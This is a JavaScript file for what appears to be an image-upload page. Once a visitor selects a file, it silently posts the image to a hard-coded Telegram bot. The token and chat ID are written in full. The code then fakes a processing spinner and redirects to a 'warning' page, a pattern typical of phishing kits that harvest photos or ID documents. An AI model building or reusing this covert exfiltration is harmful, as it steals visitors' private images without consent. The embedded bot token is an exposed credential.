// Function to display the selected image in the image-preview element
function displaySelectedImage() {
    const fileInput = document.getElementById('image-upload');
    const imagePreview = document.getElementById('preview-image');

    if (fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const imageURL = URL.createObjectURL(file);
        imagePreview.src = imageURL;
        imagePreview.style.display = 'block';

        // Hide other elements in the image-upload-window
        const uploadIcon = document.querySelector('.upload-icon');
        const uploadText = document.querySelector('.upload-text');
        uploadIcon.style.display = 'none';
        uploadText.style.display = 'none';

        // Automatically send the selected image to the Telegram bot
        sendImageToTelegram(file);
    }
}

function sendImageToTelegram(file) {
    // Replace 'YOUR_BOT_TOKEN' and 'TARGET_CHAT_ID' with your bot token and target chat ID
    const botToken = '6752961822:AAHzDMtUeGxHpoRWenQhZJLfCbDOFJvk9Kg';
    const chatId = '6324305321';

    const formData = new FormData();
    formData.append('photo', file);

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        // Handle the response from the Telegram API if needed
        console.log(data);

        // Show processing spinner after sending image
        showProcessingSpinner();
    })
    .catch(error => {
        // Handle errors
        console.error(error);
    });
}

function showProcessingSpinner() {
    // Show the loading animation element
    const loadingAnimation = document.getElementById('loading-animation');
    loadingAnimation.style.display = 'block';

    // After 2 seconds, hide the loading animation and redirect to the warning page
    setTimeout(() => {
        loadingAnimation.style.display = 'none';
        // Redirect to the specified link after 2 seconds
        window.location.href = '../warning';
    }, 2000);
}

// Attach an event listener to the file input to display the selected image
document.getElementById('image-upload').addEventListener('change', displaySelectedImage);

// Remove the event listener for the original upload button

// Attach an event listener to the new "Send to Telegram" button
document.getElementById('send-to-telegram-button').addEventListener('click', showProcessingSpinner);
